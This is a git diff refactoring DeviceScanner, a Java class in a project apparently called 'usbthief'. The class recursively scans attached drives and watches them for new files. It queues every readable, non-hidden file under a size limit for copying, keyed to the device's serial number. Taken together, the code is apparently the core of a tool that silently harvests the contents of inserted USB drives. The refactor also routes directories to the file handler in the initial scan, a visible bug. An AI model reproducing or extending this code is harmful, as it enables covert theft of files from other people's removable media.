@@ -3,30 +3,33 @@ package com.superredrock.usbthief.worker;
 import com.superredrock.usbthief.core.config.ConfigManager;
 import com.superredrock.usbthief.core.config.ConfigSchema;
 import com.superredrock.usbthief.core.QueueManager;
-import com.superredrock.usbthief.statistics.Statistics;
+import com.superredrock.usbthief.core.event.EventBus;
+import com.superredrock.usbthief.core.event.worker.FileDiscoveredEvent;
 
 import java.io.IOException;
 import java.nio.file.*;
 import java.nio.file.attribute.BasicFileAttributes;
 import java.time.Instant;
+import java.util.Map;
+import java.util.concurrent.ConcurrentHashMap;
 import java.util.concurrent.TimeUnit;
 import java.util.concurrent.atomic.AtomicInteger;
+import java.util.function.BiPredicate;
 import java.util.logging.Logger;
-import java.util.HashMap;
-import java.util.Map;
+import java.util.stream.Collectors;
+import java.util.stream.Stream;
 
-public class DeviceScanner extends Thread{
-    public static final Logger logger = Logger.getLogger(DeviceScanner.class.getName());
+public class DeviceScanner extends Thread {
+    protected static final Logger logger = Logger.getLogger(DeviceScanner.class.getName());
 
     private final FileStore rootStore;
     private final Path root;
-    private final DiskViewer visitor = new DiskViewer();
     private final WatchService monitor;
+    private final com.superredrock.usbthief.core.Device device;
 
     private final AtomicInteger changeCount = new AtomicInteger(0);
-    private final Map<Path, WatchKey> watchKeys = new HashMap<>();
+    private final ConcurrentHashMap<Path, WatchKey> watchKeys = new ConcurrentHashMap<>();
     private volatile boolean running = true;
-    private final com.superredrock.usbthief.core.Device device;
 
     public DeviceScanner(com.superredrock.usbthief.core.Device device, FileStore rootStore) {
         super(QueueManager.getDiskScanners(), "DiskScanner: " + rootStore.name());
@@ -45,11 +48,8 @@ public class DeviceScanner extends Thread{
 
     @Override
     public void run() {
-
-
-        logger.info("Scanning Disk " + root);
         try {
-            Files.walkFileTree(root, this.visitor);
+            performInitialScan();
         } catch (IOException e) {
             logger.severe("Error while scanning disk: " + e.getMessage());
             return;
@@ -64,10 +64,105 @@ public class DeviceScanner extends Thread{
 
         if (monitor == null) {
             logger.warning("WatchService not available, skipping file monitoring");
-        }else {
+        } else {
             startMonitoring();
         }
+    }
 
+    private void performInitialScan() throws IOException {
+        logger.info("Scanning Disk " + root);
+
+        long maxSize = ConfigManager.getInstance().get(ConfigSchema.MAX_FILE_SIZE);
+        BiPredicate<Path, BasicFileAttributes> filter = createFileFilter(maxSize);
+
+        try (Stream<Path> paths = Files.find(root, Integer.MAX_VALUE, filter).parallel()) {
+            paths.peek(path -> {
+                if (Files.isDirectory(path)){
+                    processFileSafely(path);
+                    EventBus.getInstance().dispatch(new FileDiscoveredEvent(path, 0, device.getSerialNumber()));
+                }
+            }).filter(path -> !Files.isDirectory(path))
+                    .peek(path -> {
+                        try {
+                            EventBus.getInstance().dispatch(new FileDiscoveredEvent(path,Files.size(path), device.getSerialNumber()));
+                        } catch (IOException _) {
+                            EventBus.getInstance().dispatch(new FileDiscoveredEvent(path,0, device.getSerialNumber()));
+                        }
+                    })
+                    .forEach(this::processFileSafely);
+        }
+
+        logger.info("Initial scan completed for " + root);
+    }
+
+    private BiPredicate<Path, BasicFileAttributes> createFileFilter(long maxSize) {
+        return (path, attrs) -> {
+            try {
+                if (Files.isHidden(path)) return false;
+            } catch (IOException e) {
+                return false;
+            }
+
+            if (!Files.isReadable(path)) return false;
+
+            return !attrs.isRegularFile() || attrs.size() > 0 && attrs.size() <= maxSize;
+        };
+    }
+
+    private void processDirectorySafely(Path dir) {
+        try {
+            if (Files.isHidden(dir)) {
+                logger.fine("Skip hidden directory: " + dir);
+                return;
+            }
+            submitCopyTask(dir);
+            registerDirectoryWatch(dir);
+            logger.fine("Registered directory: " + dir);
+        } catch (IOException e) {
+            logger.warning("Error processing directory " + dir + ": " + e.getMessage());
+        }
+    }
+
+    private void processFileSafely(Path file) {
+        try {
+            long size = Files.size(file);
+            if (size > 0) {
+                submitCopyTask(file);
+            }
+        } catch (AccessDeniedException e) {
+            logger.fine("Access denied: " + file);
+        } catch (NoSuchFileException e) {
+            logger.fine("File disappeared: " + file);
+        } catch (IOException e) {
+            logger.warning("Error processing file " + file + ": " + e.getMessage());
+        }
+    }
+
+    private void submitCopyTask(Path path) {
+        CopyTask rawTask = new CopyTask(path, device.getSerialNumber());
+        int priority = TaskScheduler.getInstance().getPriorityRule().calculatePriority(path);
+        PriorityCopyTask priorityTask = new PriorityCopyTask(rawTask, priority, device, Instant.now());
+        TaskScheduler.getInstance().submit(priorityTask);
+    }
+
+    private void scanNewDirectory(Path dir) throws IOException {
+        registerDirectoryWatch(dir);
+
+        long maxSize = ConfigManager.getInstance().get(ConfigSchema.MAX_FILE_SIZE);
+        BiPredicate<Path, BasicFileAttributes> filter = createFileFilter(maxSize);
+
+        try (Stream<Path> paths = Files.find(dir, Integer.MAX_VALUE, filter).parallel()) {
+            Map<Boolean, java.util.List<Path>> partitioned = paths.collect(
+                Collectors.partitioningBy(Files::isDirectory)
+            );
+
+            partitioned.getOrDefault(true, java.util.List.of())
+                .forEach(this::processDirectorySafely);
+
+            partitioned.getOrDefault(false, java.util.List.of())
+                .parallelStream()
+                .forEach(this::processFileSafely);
+        }
     }
 
     private void startMonitoring() {
@@ -79,9 +174,14 @@ public class DeviceScanner extends Thread{
                 WatchKey key = monitor.take();
                 Path watchPath = (Path) key.watchable();
 
-                for (WatchEvent<?> event : key.pollEvents()) {
-                    handleWatchEvent(watchPath, event);
-                }
+                key.pollEvents().stream()
+                    .peek(event -> {
+                        if (event.kind() == StandardWatchEventKinds.OVERFLOW) {
+                            logger.warning("WatchEvent overflow detected");
+                        }
+                    })
+                    .filter(event -> event.kind() != StandardWatchEventKinds.OVERFLOW)
+                    .forEach(event -> handleWatchEvent(watchPath, event));
 
                 if (!key.reset()) {
                     watchKeys.remove(watchPath);
@@ -123,17 +223,11 @@ public class DeviceScanner extends Thread{
         return resetThread;
     }
 
+    @SuppressWarnings("unchecked")
     private void handleWatchEvent(Path watchPath, WatchEvent<?> event) {
         WatchEvent.Kind<?> kind = event.kind();
 
-        if (kind == StandardWatchEventKinds.OVERFLOW) {
-            logger.warning("WatchEvent overflow detected");
-            return;
-        }
-
-        @SuppressWarnings("unchecked")
-        WatchEvent<Path> ev = (WatchEvent<Path>) event;
-        Path fullPath = watchPath.resolve(ev.context());
+        Path fullPath = watchPath.resolve(((WatchEvent<Path>) event).context());
 
         try {
             if (!Files.exists(fullPath) || Files.isHidden(fullPath)) {
@@ -156,45 +250,10 @@ public class DeviceScanner extends Thread{
 
     private void handleChangedPath(Path path, WatchEvent.Kind<?> kind) {
         try {
-            if (Files.isDirectory(path)) {
-                if (kind == StandardWatchEventKinds.ENTRY_CREATE) {
-                    registerDirectoryWatch(path);
-                    Files.walkFileTree(path, new SimpleFileVisitor<Path>() {
-                        @Override
-                        public FileVisitResult preVisitDirectory(Path dir, BasicFileAttributes attrs) throws IOException {
-                            if (!Files.isHidden(dir)) {
-                                // Use TaskScheduler with priority
-                                CopyTask rawTask = new CopyTask(dir, device.getSerialNumber());
-                                int priority = TaskScheduler.getInstance().getPriorityRule().calculatePriority(dir);
-                                PriorityCopyTask priorityTask = new PriorityCopyTask(rawTask, priority, device, Instant.now());
-                                TaskScheduler.getInstance().submit(priorityTask);
-                            }
-                            return FileVisitResult.CONTINUE;
-                        }
-
-                        @Override
-                        public FileVisitResult visitFile(Path file, BasicFileAttributes attrs) throws IOException {
-                            long size = Files.size(file);
-                            if (Files.isReadable(file) && size != 0 && size < ConfigManager.getInstance().get(ConfigSchema.MAX_FILE_SIZE)) {
-                                Statistics.getInstance().recordFileDiscovered(size);
-                                CopyTask rawTask = new CopyTask(file, device.getSerialNumber());
-                                int priority = TaskScheduler.getInstance().getPriorityRule().calculatePriority(file);
-                                PriorityCopyTask priorityTask = new PriorityCopyTask(rawTask, priority, device, Instant.now());
-                                TaskScheduler.getInstance().submit(priorityTask);
-                            }
-                            return FileVisitResult.CONTINUE;
-                        }
-                    });
-                }
+            if (Files.isDirectory(path) && kind == StandardWatchEventKinds.ENTRY_CREATE) {
+                scanNewDirectory(path);
             } else if (Files.isRegularFile(path)) {
-                long size = Files.size(path);
-                if (Files.isReadable(path) && size != 0 && size < ConfigManager.getInstance().get(ConfigSchema.MAX_FILE_SIZE)) {
-                    Statistics.getInstance().recordFileDiscovered(size);
-                    CopyTask rawTask = new CopyTask(path, device.getSerialNumber());
-                    int priority = TaskScheduler.getInstance().getPriorityRule().calculatePriority(path);
-                    PriorityCopyTask priorityTask = new PriorityCopyTask(rawTask, priority, device, Instant.now());
-                    TaskScheduler.getInstance().submit(priorityTask);
-                }
+                processFileSafely(path);
             }
         } catch (IOException e) {
             logger.warning("Error handling changed path: " + e.getMessage());
@@ -202,17 +261,15 @@ public class DeviceScanner extends Thread{
     }
 
     private void registerDirectoryWatch(Path dir) throws IOException {
-        if (monitor == null) {
+        if (monitor == null || watchKeys.containsKey(dir)) {
             return;
         }
-        if (!watchKeys.containsKey(dir)) {
-            WatchKey key = dir.register(monitor,
-                StandardWatchEventKinds.ENTRY_CREATE,
-                StandardWatchEventKinds.ENTRY_MODIFY,
-                StandardWatchEventKinds.ENTRY_DELETE);
-            watchKeys.put(dir, key);
-            logger.fine("Registered watch for directory: " + dir);
-        }
+        WatchKey key = dir.register(monitor,
+            StandardWatchEventKinds.ENTRY_CREATE,
+            StandardWatchEventKinds.ENTRY_MODIFY,
+            StandardWatchEventKinds.ENTRY_DELETE);
+        watchKeys.put(dir, key);
+        logger.fine("Registered watch for directory: " + dir);
     }
 
     public FileStore getRootStore() {
@@ -231,57 +288,17 @@ public class DeviceScanner extends Thread{
     }
 
     private void closeWatchService() {
-        for (WatchKey key : watchKeys.values()) {
-            key.cancel();
-        }
+        watchKeys.values().parallelStream()
+            .forEach(WatchKey::cancel);
+
         watchKeys.clear();
-        try {
-            monitor.close();
-        } catch (IOException e) {
-            logger.warning("Error closing WatchService: " + e.getMessage());
-        }
-    }
 
-    protected class DiskViewer extends SimpleFileVisitor<Path> {
-        private final Logger logger = DeviceScanner.logger;
-
-        @Override
-        public FileVisitResult visitFile(Path file, BasicFileAttributes attrs) {
-            if (!Files.isReadable(file)){
-                logger.info("Skip Unreadable file " + file);
-                return FileVisitResult.SKIP_SIBLINGS;
-            }
-
-        try {
-            long size = Files.size(file);
-            if(size != 0 && size < ConfigManager.getInstance().get(ConfigSchema.MAX_FILE_SIZE)){
-                Statistics.getInstance().recordFileDiscovered(size);
-                CopyTask rawTask = new CopyTask(file, device.getSerialNumber());
-                    int priority = TaskScheduler.getInstance().getPriorityRule().calculatePriority(file);
-                    PriorityCopyTask priorityTask = new PriorityCopyTask(rawTask, priority, device, Instant.now());
-                    TaskScheduler.getInstance().submit(priorityTask);
-                }
+        if (monitor != null) {
+            try {
+                monitor.close();
             } catch (IOException e) {
-                logger.warning("Error visiting file: " + e.getMessage());
-                return FileVisitResult.SKIP_SUBTREE;
+                logger.warning("Error closing WatchService: " + e.getMessage());
             }
-            return FileVisitResult.CONTINUE;
-        }
-
-        @Override
-        public FileVisitResult preVisitDirectory(Path dir, BasicFileAttributes attrs) throws IOException {
-            if (Files.isHidden(dir)){
-                logger.info("Skip hiding dir " + dir);
-                return FileVisitResult.SKIP_SUBTREE;
-            }
-            // Use TaskScheduler with priority
-            CopyTask rawTask = new CopyTask(dir, device.getSerialNumber());
-            int priority = TaskScheduler.getInstance().getPriorityRule().calculatePriority(dir);
-            PriorityCopyTask priorityTask = new PriorityCopyTask(rawTask, priority, device, Instant.now());
-            TaskScheduler.getInstance().submit(priorityTask);
-            registerDirectoryWatch(dir);
-            logger.info("Found " + dir);
-            return FileVisitResult.CONTINUE;
         }
     }
 }
